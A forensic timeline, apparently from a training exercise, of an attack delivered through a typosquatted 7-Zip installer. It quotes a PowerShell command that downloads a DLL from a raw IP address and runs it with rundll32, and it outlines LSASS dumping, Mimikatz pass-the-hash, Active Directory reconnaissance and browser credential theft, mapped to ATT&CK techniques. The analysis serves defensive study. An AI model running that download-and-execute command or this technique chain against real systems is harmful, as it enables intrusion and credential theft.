@@ -1,0 +1,33 @@
+Forensic Analysis of an Attack Delivered via a Malicious .7z Archive
+
+The attack involved execution, persistence, and credential extraction. The use of Mimikatz and lateral movement suggests that multiple privileged accounts may have been compromised.
+
+2023-09-26 14:22:07.433 Perry accessed a typosquatted domain (7zipp.org) and downloaded a trojanized installer (7z2301-x64.msi). This action initiated a PowerShell process.
+
+2023-09-26 14:23:02.935, PowerShell executed the script a/7z.ps1 -useb. At 14:23:05.656 powershell created a Scriptblock text in a Temp file called 7zlegit.exe. This script created a service (7zservice) using sc.exe and executed the following command: iwr http://206.189.34.218/a/7zipp.dll -outfile 'C:\Program Files\7-zip\7zipp.dll'; rundll32 'C:\Program Files\7-zip\7zipp.dll',Start'. 	
+
+2023-09-26 14:23:07.159, the adversary executed additional malicious PowerShell commands, which allowed the trojanized installer to download additional payloads. This enabled preparation for further lateral movement.
+
+2023-09-26 14:23:23 The attacker ensured persistence by creating a malicious service named 7zservice. This service was configured to execute 7zipp.exe and load the trojanized 7zipp.dll via rundll32.exe, guaranteeing that the malware would run automatically with SYSTEM privileges.
+
+2023-09-26 14:23:48 After creating the 7zService for persistence, the payload was executed. The attacker used the legitimate Windows utility rundll32.exe to load and run code from their malicious DLL, 7zipp.dll. This technique allows the adversary to execute their malicious code in the context of a trusted system process, bypassing basic security controls.
+
+2023-09-26 14:24:22  With their malicious code now running the attacker's next step was to harvest credentials. They executed Invoke-NanoDump.ps1, a PowerShell script designed to dump the memory of the LSASS process (lsass.exe) and steal passwords and hashes
+
+2023-09-26 14:26:46 After gaining initial credentials, the attacker began active reconnaissance of the Active Directory environment. They used PowerShell to download and execute SharpHound.ps1 and PowerView.ps1. These actions allowed them to map domain users, groups, and identify high value targets.
+
+2023-09-26 14:28:53, the attacker used PowerShell to download mimikatz_trunk.zip from official GitHub repository. This tool was likely intended to facilitate a Pass-the-Hash attack.
+
+2023-09-26 14:29:43, the attacker performed lateral movement using Mimikatz tool and also performed a Pass the-Hash attack using sekurlsa::pth. This allowed them to impersonate a user with a stolen NTLM hash and use that session to execute a 'whoami' via Invoke-Command to validate their lateral movement capability 
+
+2023-09-26 15:08:24 After gaining access to WKSTN-02, the attacker continued to harvest credentials. They downloaded and executed 'Invoke-SharpChromium' to steal passwords, cookies, and other data saved in the user's web browsers
+
+Execution: T1059 (PowerShell)
+
+Persistence: T1543 (Services)
+
+Credential Access: T1003 (LSASS Dumping)
+
+Discovery: T1087 / T1069
+
+Lateral Movement: T1021
